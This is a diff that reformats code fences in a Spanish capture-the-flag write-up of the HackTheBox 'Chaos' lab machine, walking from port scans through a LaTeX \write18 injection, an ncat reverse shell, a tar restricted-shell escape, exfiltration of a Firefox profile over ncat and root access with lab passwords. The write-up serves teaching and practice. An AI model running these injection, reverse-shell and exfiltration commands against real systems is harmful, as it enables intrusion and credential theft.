@@ -27,7 +27,8 @@ Su tarjeta de presentación es:
 
 Iniciamos por ejecutar un `nmap` y un `masscan` para identificar puertos udp y tcp abiertos:
 
-```root@laptop:~#  nmap -sS -p- --open -v -n 10.10.10.120
+``` text
+root@laptop:~#  nmap -sS -p- --open -v -n 10.10.10.120
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-23 23:00 CST
 Initiating Ping Scan at 23:00
 Scanning 10.10.10.120 [4 ports]
@@ -68,7 +69,7 @@ Nmap done: 1 IP address (1 host up) scanned in 137.49 seconds
 
 Continuemos con el doblecheck usando `masscan`:
 
-```text
+``` text
 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-02-27 05:20:02 GMT
  -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
 Initiating SYN Stealth Scan
@@ -91,7 +92,7 @@ Como podemos ver, los puertos corresponden entre si (TCP), por lo que continuamo
 
 Lanzamos `nmap` con los parámetros habituales para la identificación (\-sC \-sV):
 
-```text
+``` text
 root@laptop:~# nmap -sV -sC -p80,110,143,993,995,10000 -n 10.10.10.120
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-09 20:21 CDT
 Nmap scan report for 10.10.10.120
@@ -145,7 +146,7 @@ Importante que durante la enumeración, el daemon que se encarga del correo es *
 
 Comencemos por obtener mas información sobre los archivos y carpetas sobre el servicio HTTP (TCP/80):
 
-```text
+``` text
 xbytemx@laptop:~/htb/chaos$ http 10.10.10.120
 HTTP/1.1 200 OK
 Accept-Ranges: bytes
@@ -418,7 +419,7 @@ Copyright &copy;<script>document.write(new Date().getFullYear());</script> All r
 
 Aplicamos un `gobuster` en búsqueda de mas información:
 
-```text
+``` text
 xbytemx@laptop:~/htb/chaos$ ~/tools/gobuster -x pdf,txt,odt,html,php -u http://10.10.10.120 -w ~/git/payloads/owasp/dirbuster/directory-list-lowercase-2.3-small.txt -t 20
 
 =====================================================
@@ -447,7 +448,7 @@ Progress: 9352 / 81644 (11.45%)^C
 
 Rompí el `gobuster` tan pronto como vi que había encontrado una carpeta wp o lo que vendría siendo wordpress, así que exploremos si es un wordpress:
 
-```html
+``` html
 xbytemx@laptop:~$ http http://10.10.10.120/wp/
 HTTP/1.1 200 OK
 Connection: Keep-Alive
@@ -479,7 +480,7 @@ Vary: Accept-Encoding
 
 Dentro de la carpeta wp, solo vemos que hay otra carpeta llamada wordpress, plop. Volvamos a tocar base en `/wp/wordpress/`, esta vez solo headers:
 
-```text
+``` text
 xbytemx@laptop:~$ http --header http://10.10.10.120/wp/wordpress/
 HTTP/1.1 200 OK
 Connection: Keep-Alive
@@ -495,7 +496,7 @@ Vary: Accept-Encoding
 
 Hemos llegado al wordpress, así que antes de explorar dejemos un `wpscan`:
 
-```text
+``` text
 xbytemx@laptop:~/git/wpscan$ wpscan --url http://10.10.10.120/wp/wordpress/
 _______________________________________________________________
         __          _______   _____
@@ -676,7 +677,7 @@ Vamos al post original http://10.10.10.120/wp/wordpress/index.php/2018/10/28/cha
 
 Ahora que estamos sobre nuestro objetivo, busquemos pistas:
 
-```text
+``` text
 xbytemx@laptop:~/blog$ cewl http://10.10.10.120/wp/wordpress/index.php/2018/10/28/chaos/
 CeWL 5.4.4.1 (Arkanoid) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
 chaos
@@ -783,7 +784,7 @@ xbytemx@laptop:~/htb/chaos$ cewl http://10.10.10.120/wp/wordpress/ | grep -v "ro
 
 Aquí una nota importante, al menos yo no encontré una herramienta que haga todo el trabajo y que me ayude a hacer este _brute-forcing_... pero afortunadamente existe **python**:
 
-```python
+``` python
 #!/usr/bin/env python
 # -*- coding: utf8 -*-
 
@@ -818,7 +819,7 @@ if __name__ == '__main__':
 
 Después de ejecutar este script, tendremos la siguiente salida:
 
-```text
+``` text
 xbytemx@laptop:~/htb/chaos$ python post_brute-forcer.py
 La contraseña del post es: human
 El contenido protegido es:
@@ -841,7 +842,7 @@ Lo cual corresponde a las credenciales del webmail (TCP/10000) que encontramos a
 
 Empezamos por tratar de conectarnos al servidor:
 
-```text
+``` text
 xbytemx@laptop:~/htb/chaos$ http 10.10.10.120:10000
 HTTP/1.0 200 Document follows
 Connection: close
@@ -855,7 +856,7 @@ Server: MiniServ/1.890
 
 Nos indica que necesita cambiar la conexion de HTTP a HTTPS:
 
-```html
+``` html
 xbytemx@laptop:~/htb/chaos$ http --verify=no https://10.10.10.120:10000
 HTTP/1.0 200 Document follows
 Auth-type: auth-required=1
@@ -917,7 +918,7 @@ Ahora, como no encontré via `gobuster` la carpeta con el webmail, lo que decid�
 
 Ok, me gustan mucho las herramientas simples de consola, así que decidí conectarme por telnet/curl:
 
-```text
+``` text
 xbytemx@laptop:~/htb/chaos$ curl imap://ayush:jiujitsu@10.10.10.120
 curl: (67) Login denied
 xbytemx@laptop:~/htb/chaos$ telnet 10.10.10.120 143
@@ -944,7 +945,7 @@ xbytemx@laptop:~/htb/chaos$ curl -k imaps://ayush:jiujitsu@10.10.10.120
 
 Como pudimos ver, nos acepta las credenciales por lo que ahora podemos usar `mbsync` para bajarnos el buzón del usuario _ayush_
 
-```text
+``` text
 xbytemx@laptop:~/htb/chaos$ cat mbsyncrc
 IMAPAccount chaos
 Host chaos.htb
@@ -980,7 +981,7 @@ C: 1/1  B: 3/3  M: +0/0 *0/0 #0/0  S: +1/1 *0/0 #0/0
 
 Ya que descargamos el buzón de _ayush_ exploremos en casa su contenido y encontraremos el siguiente draft:
 
-```text
+``` text
 xbytemx@laptop:~$ cat mail-chaos/Drafts/cur/1556337228.17058_1.laptop\,U\=1\:2\,S
 MIME-Version: 1.0
 Content-Type: multipart/mixed;
@@ -1049,7 +1050,7 @@ Ayush estaba preparando un correo con un texto cifrado, el script de cifrado y n
 
 Cambiemos el encoding de BASE64 a Texto para en.py y tendremos lo siguiente:
 
-```python
+``` python
 def encrypt(key, filename):
     chunksize = 64*1024
     outputFile = "en" + filename
@@ -1082,7 +1083,7 @@ Como podemos ver, este programa devuelve un en + filename que cifra en AES_128_C
 
 Realizar el proceso inverso es relativamente simple, por lo que cree de.py:
 
-```python
+``` python
 from Crypto import Random
 from Crypto.Cipher import AES
 from Crypto.Hash import SHA256
@@ -1123,7 +1124,7 @@ Este programa me devuelve im_msg.txt usando el proceso inverso anteriormente des
 
 El contenido de im_msg.txt es el siguiente:
 
-```text
+``` text
 xbytemx@laptop:~/htb/chaos$ strings im_msg.txt
 0000000000000272
 tg42C
@@ -1133,7 +1134,7 @@ SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAu
 
 Como podemos ver, el contenido no es muy entendible, pero ese ultimo string parece un BASE64, por lo que despues de cambiar el encoding:
 
-```text
+``` text
 xbytemx@laptop:~/htb/chaos$ printf "SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK" | base64 -d
 Hii Sahay
 
@@ -1153,7 +1154,7 @@ Parece que hemos encontrado un nuevo sitio en el servicio HTTP TCP/80.
 
 Comenzamos por validar su existencia vía headers:
 
-```text
+``` text
 xbytemx@laptop:~/htb/chaos$ curl -I http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/
 HTTP/1.1 200 OK
 Date: Sat, 27 Apr 2019 04:54:00 GMT
@@ -1167,7 +1168,7 @@ Ahora, usando un browser:
 
 Como podemos ver parece que se trata de una herramienta para convertir una plantilla a PDF. Veamos por consola como se comporta por defecto cuando generamos un PDF:
 
-```text
+``` text
 xbytemx@laptop:~/htb/chaos$ http -f POST http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php 'content=hello' template=test3
 HTTP/1.1 200 OK
 Connection: Keep-Alive
@@ -1233,7 +1234,7 @@ Transcript written on 1dc4b77d86170fff881960b55c83fa75.log.
 
 El LOG nos arroja la versión y el binario que se esta utilizando `pdfTeX, Version 3.14159265-2.6-1.40.19`. Busque rápidamente el google y encontré el siguiente **[enlace](http://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)** que explica como podríamos aprovecharnos de la instrucción de latex `\\write18` para ejecutar comandos de manera remota (RCE), así que, apliquemos nuestra PoC:
 
-```text
+``` text
 xbytemx@laptop:~/htb/chaos$ http -f POST http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php 'content=\\immediate\\write18{echo; echo; ls -Ral /home}' template=test3
 HTTP/1.1 200 OK
 Connection: Keep-Alive
@@ -1309,13 +1310,13 @@ Perfecto, parece que ahora ya podemos hacer un RCE sobre el servidor, por lo que
 
 Preparamos un listener:
 
-```text
+``` text
 xbytemx@laptop:~/htb/chaos$ ncat -lnp 3001
 ```
 
 Ejecutamos un reverse shell:
 
-```text
+``` text
 xbytemx@laptop:~/htb/chaos$ http -f POST http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php 'content=\\immediate\\write18{ncat 10.10.14.12 3001 -e /bin/bash}' template=test3
 
 http: error: Request timed out (30s).
@@ -1323,7 +1324,7 @@ http: error: Request timed out (30s).
 
 En nuestro listener:
 
-```text
+``` text
 xbytemx@laptop:~/htb/chaos$ ncat -lnp 3001
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -1337,7 +1338,7 @@ www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$
 
 Bien ahora que ya tenemos conexión al servidor y que hemos hecho el upgrade de la tty, veamos que hay sobre home:
 
-```text
+``` text
 www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ ls -la /home
 ls -la /home
 total 16
@@ -1349,7 +1350,7 @@ drwx------  5 sahay sahay 4096 Nov 24 23:53 sahay
 
 Los dos usuarios del correo. Solo que como somos www-data, no podemos leer nada del contenido de cada home por los permisos. Luego entonces, centremonos en lo que si tenemos permisos:
 
-```text
+``` text
 www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ ls -lah /var/www
 <00_w1ll_f1Nd_n07H1n9_H3r3/compile$ ls -lah /var/www
 total 20K
@@ -1412,7 +1413,7 @@ Tenemos las tres carpetas de `/var/www`, main, html y roundcube. El que esta en 
 
 Comprobamos esto contra los sitios habilitados:
 
-```text
+``` text
 www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ cat /etc/apache2/sites-enabled/*
 <H1n9_H3r3/compile$ cat /etc/apache2/sites-enabled/*
 <VirtualHost *:80>
@@ -1502,7 +1503,7 @@ Como podemos ver, se trataba de un subdominio de chaos.htb, **webmail.chaos.htb*
 
 Ahora, revisando la configuración de la aplicación encontramos algo interesante:
 
-```text
+``` text
 www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ ls -lah /var/www/roundcube/config/
 <n9_H3r3/compile$ ls -lah /var/www/roundcube/config/
 total 76K
@@ -1594,7 +1595,7 @@ Nice, ahora tenemos unas credenciales de mysql para explorar.
 
 No sin antes cambiar, recordemos que también la aplicación de wordpress debe declarar una base de datos en la instalación:
 
-```text
+``` text
 www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ ls -lah /var/www/html/wp/wordpress/
 <9_H3r3/compile$ ls -lah /var/www/html/wp/wordpress/
 total 204K
@@ -1671,7 +1672,7 @@ Consolidemos la información que acabamos de obtener del servicio de DB:
 
 Exploremos ahora mysql:
 
-```text
+``` text
 www-data@chaos:/var/www/roundcube/config$ mysql -u roundcube -h localhost -p
 mysql -u roundcube -h localhost -p
 Enter password: inner[OnCag8
@@ -1796,7 +1797,7 @@ mysql>
 
 Como podemos ver aquí hay un callejón muerto. Ponernos a romper el hash es muy tardado, sabemos que el hash de ayush es igual a `jiujitsu`. Momento, aun no hemos probado cambiar de www-data a ayush con las credenciales del servicio:
 
-```text
+``` text
 www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ su - ayush
 su - ayush
 Password: jiujitsu
@@ -1810,7 +1811,7 @@ Y hemos escalado de www-data a ayush.
 
 Al llegar a ayush nos daremos cuenta que no tenemos una shell completa:
 
-```text
+``` text
 ayush@chaos:~$ ls -lah
 ls -lah
 Command 'ls' is available in '/bin/ls'
@@ -1834,7 +1835,7 @@ Drafts	Sent
 
 Parece que faltan algunos comandos (ls no pero dir si, que es esto, windows?). Veamos que dicen las variables de entorno:
 
-```text
+``` text
 ayush@chaos:~$ echo $PATH
 echo $PATH
 /home/ayush/.app
@@ -1847,7 +1848,7 @@ Parece que solo podemos trabajar con estos tres comandos: `dir`, `ping` y `tar`.
 
 No hay problema, [google nos ayuda a escalar](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf) encontrando como usar `tar` como pivote:
 
-```text
+``` text
 ayush@chaos:~$ tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/sh
 <ile --checkpoint=1 --checkpoint-action=exec=/bin/sh
 tar: testfile: Cannot stat: No such file or directory
@@ -1856,7 +1857,7 @@ $
 
 Yeah, ahora nada nos detendrá!
 
-```text
+``` text
 $ id
 id
 /bin/sh: 1: id: not found
@@ -1869,7 +1870,7 @@ env
 
 Bueno tal vez la variable $PATH:
 
-```text
+``` text
 $ export PATH="/usr/local/bin:/usr/bin:/bin"
 export PATH="/usr/local/bin:/usr/bin:/bin"
 $ ls
@@ -1916,7 +1917,7 @@ drwx------ 4 ayush ayush 4.0K Sep 29  2018 .mozilla
 
 Desde el home de ayush ejecutamos el cat de user.txt:
 
-```text
+``` text
 ayush@chaos:~$ cat user.txt
 ```
 
@@ -1924,7 +1925,7 @@ ayush@chaos:~$ cat user.txt
 
 Primero y entre otras cosas, veamos que tanto tenemos en el directorio de ayush:
 
-```text
+``` text
 ayush@chaos:~$ ls -laR
 ls -laR
 .:
@@ -2217,7 +2218,7 @@ Básicamente tenemos tres directorios interesantes en $home, el primero es `.moz
 
 Me lleve este directorio fuera para poderlo trabajar mas comodamente:
 
-```text
+``` text
 ayush@chaos:~$ tar cvz ./.mozilla/firefox/bzo7sjt1.default/ | ncat --send-only 10.10.14.12 4001
 <o7sjt1.default/ | ncat --send-only 10.10.14.12 4001
 ./.mozilla/firefox/bzo7sjt1.default/
@@ -2308,7 +2309,7 @@ A pesar de los problemas de permisos, ya el material importante del profile esta
 
 Antes de ejecutar el comando anterior, ejecute lo mio en el listener:
 
-```text
+``` text
 xbytemx@laptop:~/htb/chaos$ mkdir firefox
 xbytemx@laptop:~/htb/chaos$ cd firefox/
 xbytemx@laptop:~/htb/chaos/firefox$ ncat -l -p 4001 | tar xvz
@@ -2381,7 +2382,7 @@ xbytemx@laptop:~/htb/chaos/firefox$
 
 Esta información fue un poco como plana, tenemos en general cosas del sitio www.google.com, hasta que me percate que también teníamos un registro de chaos.htb:
 
-```text
+``` text
 xbytemx@laptop:~/htb/chaos/firefox/.mozilla/firefox/bzo7sjt1.default$ find . -type f -exec grep 'chaos.htb' {} \;
 chaos.htb:10000	OID.2.16.840.1.101.3.4.2.1	C3:99:F8:77:6B:9F:0E:54:D4:29:FC:99:1D:1E:AB:C6:4E:2D:80:41:08:37:5E:B5:3B:87:BA:44:80:2C:88:CE	MU	AAAAAAAAAAAAAAAJAAAATQDbHfGdsjNmrTBLMSIwIAYDVQQKDBlXZWJtaW4gV2Vic2VydmVyIG9uIGNoYW9zMQowCAYDVQQDDAEqMRkwFwYJKoZIhvcNAQkBFgpyb290QGNoYW9z
 Coincidencia en el fichero binario ./places.sqlite
@@ -2390,7 +2391,7 @@ Coincidencia en el fichero binario ./places.sqlite
 
 Como podemos ver se trata de una contraseña para el sitio webmin al que no pudimos acceder antes. Para descifrar la contraseña necesitamos utilizar otra herramienta, la cual encontramos en github:
 
-```text
+``` text
 xbytemx@laptop:~/git/firefox_decrypt$ python firefox_decrypt.py /home/xbytemx/htb/chaos/firefox/.mozilla/firefox/bzo7sjt1.default/
 2019-04-27 02:38:12,107 - WARNING - profile.ini not found in /home/xbytemx/htb/chaos/firefox/.mozilla/firefox/bzo7sjt1.default/
 2019-04-27 02:38:12,107 - WARNING - Continuing and assuming '/home/xbytemx/htb/chaos/firefox/.mozilla/firefox/bzo7sjt1.default/' is a profile location
@@ -2405,7 +2406,7 @@ xbytemx@laptop:~/git/firefox_decrypt$
 
 Llegar hasta aquí para regresar a una aplicación no parecía lo mas obvio después de identificar las credenciales de _ayush_ como user de app y sistema operativo, así que probé las credenciales de root:
 
-```text
+``` text
 ayush@chaos:~$ su - root
 su - root
 Password: Thiv8wrej~
@@ -2417,7 +2418,7 @@ Y... somos root.
 
 # cat root.txt
 
-```text
+``` text
 root@chaos:~# cat root.txt
 ```
 
